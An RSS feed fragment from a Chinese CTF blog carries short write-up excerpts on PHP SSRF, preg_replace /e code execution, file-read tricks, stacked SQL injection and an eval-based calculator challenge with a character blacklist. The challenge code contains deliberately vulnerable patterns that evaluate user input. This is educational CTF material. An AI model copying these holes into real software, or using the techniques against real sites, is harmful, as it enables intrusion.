</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$blog</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$age</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span> <span class="o">=</span> <span class="nv">$blog</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$httpCode</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">404</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getBlogContents</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isValidBlog</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$blog</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>给的这部分源码给到一个类，三个属性，还有一个对<code>blog</code>的正则匹配</p>
        
        <hr><p>本文2025-07-01首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-01</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>Preg_replace E Rce</title>
      <link>https://www.lier.xin/post/preg_replace-e-rce/</link>
      <pubDate>Mon, 30 Jun 2025 21:00:01 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/preg_replace-e-rce/</guid>
      <description>
        <![CDATA[<h1>Preg_replace E Rce</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="preg_replace-e漏洞分析">
<a class="header-anchor" href="#preg_replace-e%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90"></a>
<code>preg_replace /e</code>漏洞分析
</h2><p>tips</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/e 可执行模式，此为PHP专有参数，例如preg_replace函数。
</span></span><span class="line"><span class="cl">preg_replace(
</span></span><span class="line"><span class="cl">    string|array $pattern,
</span></span><span class="line"><span class="cl">    string|array $replacement,
</span></span><span class="line"><span class="cl">    string|array $subject,
</span></span><span class="line"><span class="cl">)
</span></span><span class="line"><span class="cl">/e模式下
</span></span><span class="line"><span class="cl">在subject字符中正则匹配pattern，匹配成功则执行$replacement
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/test/e&#34;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;h&#34;</span><span class="p">],</span><span class="s2">&#34;jutst test&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span><span class="line"><span class="cl"><span class="err">高版本中不支持preg_replace函数
</span></span></span><span class="line"><span class="cl"><span class="err">payload中;不加也行
</span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250630183402441.png" alt="image-20250630183402395"></p>
<h3 id="php可变变量">
<a class="header-anchor" href="#php%e5%8f%af%e5%8f%98%e5%8f%98%e9%87%8f"></a>
php可变变量
</h3><p>这里补充一下php可变变量这个知识点</p>
        
        <hr><p>本文2025-06-30首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-06-30</p>]]>
      </description>
      
        <category>Learning</category>
      
    </item>
    
    

    <item>
      <title>网鼎杯 2020 朱雀组 Phpweb</title>
      <link>https://www.lier.xin/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/</link>
      <pubDate>Sun, 29 Jun 2025 22:54:30 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/</guid>
      <description>
        <![CDATA[<h1>网鼎杯 2020 朱雀组 Phpweb</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="思路">
<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
思路
</h2><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250629223227176.png" alt="image-20250629223227071"></p>
<h3 id="1抓包参数一个为date一个为y-m-d-his-a">
<a class="header-anchor" href="#1%e6%8a%93%e5%8c%85%e5%8f%82%e6%95%b0%e4%b8%80%e4%b8%aa%e4%b8%badate%e4%b8%80%e4%b8%aa%e4%b8%bay-m-d-his-a"></a>
1、抓包参数一个为<code>date</code>一个为<code>Y-m-d h:i:s a</code>
</h3><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250629223531336.png" alt="image-20250629223531311"></p>
<p>注意到第一个参数为函数名，第二个参数为函数的参数</p>
<h3 id="2这里很多函数被ban尝试不同函数读取indexphp">
<a class="header-anchor" href="#2%e8%bf%99%e9%87%8c%e5%be%88%e5%a4%9a%e5%87%bd%e6%95%b0%e8%a2%abban%e5%b0%9d%e8%af%95%e4%b8%8d%e5%90%8c%e5%87%bd%e6%95%b0%e8%af%bb%e5%8f%96indexphp"></a>
2、这里很多函数被ban，尝试不同函数读取<code>index.php</code>
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">include()+伪协议
</span></span><span class="line"><span class="cl">file_get_contents()
</span></span><span class="line"><span class="cl">readfile()
</span></span><span class="line"><span class="cl">readgzfile()
</span></span></code></pre></div><p>这里尝试读取没有在常见位置读到flag</p>
        
        <hr><p>本文2025-06-29首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-06-29</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>Iscc 2025_基本功</title>
      <link>https://www.lier.xin/post/iscc-2025_%E5%9F%BA%E6%9C%AC%E5%8A%9F/</link>
      <pubDate>Tue, 24 Jun 2025 19:07:57 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/iscc-2025_%E5%9F%BA%E6%9C%AC%E5%8A%9F/</guid>
      <description>
        <![CDATA[<h1>Iscc 2025_基本功</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="iscc-2025_基本功">
<a class="header-anchor" href="#iscc-2025_%e5%9f%ba%e6%9c%ac%e5%8a%9f"></a>
Iscc 2025_基本功
</h2><p>打开题目</p>
<p><img src="https://li20050725.oss-cn-beijing.aliyuncs.com/img/image-20250511125253702.png" alt="image-20250511125253702"></p>
<p>告诉我们关键点是输入正确的“用户代理”身份标识与英雄名称，很容易联想到是不是修改User-Agent。</p>
<p>我们直接在当前页面修改一下试试，发现直接跳转到Process.php页面，并且显示黑客入侵无处不在！！！在这里输入信息是没用的！！！</p>
        
        <hr><p>本文2025-06-24首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-06-24</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>SUCTF 2019_EasySQL</title>
      <link>https://www.lier.xin/post/suctf-2019_easysql/</link>
      <pubDate>Fri, 20 Jun 2025 23:37:00 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/suctf-2019_easysql/</guid>
      <description>
        <![CDATA[<h1>SUCTF 2019_EasySQL</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="思路">
<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
思路
</h2><p>1、ban了很多东西-关键是<code>and or &amp;&amp; ||</code>等连接词、<code>^</code>可以用
2、<code>or</code>误伤了<code>information_schema</code>,经过多次尝试发现限制了长度，意味着报错和盲注都无法进行，应该意识到是堆叠注入</p>
        
        <hr><p>本文2025-06-20首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-06-20</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>RoarCTF 2019_EasyCalc</title>
      <link>https://www.lier.xin/post/roarctf-2019_easycalc/</link>
      <pubDate>Fri, 20 Jun 2025 23:28:36 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/roarctf-2019_easycalc/</guid>
      <description>
        <![CDATA[<h1>RoarCTF 2019_EasyCalc</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="思路">
<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
思路
</h2><p>1、前端源码提示<code>WAF</code>和<code>calc.php</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250620220634925.png" alt="1">
2、访问<code>calc.php</code>,题目代码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">,</span> <span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;\[&#39;</span><span class="p">,</span> <span class="s1">&#39;\]&#39;</span><span class="p">,</span><span class="s1">&#39;\$&#39;</span><span class="p">,</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span><span class="s1">&#39;\^&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">&#39;/m&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;what are you want to do?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo &#39;</span><span class="o">.</span><span class="nv">$str</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>题目代码很简单，但是存在<code>WAF</code></p>
        
        <hr><p>本文2025-06-20首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-06-20</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
  </channel>
</rss>
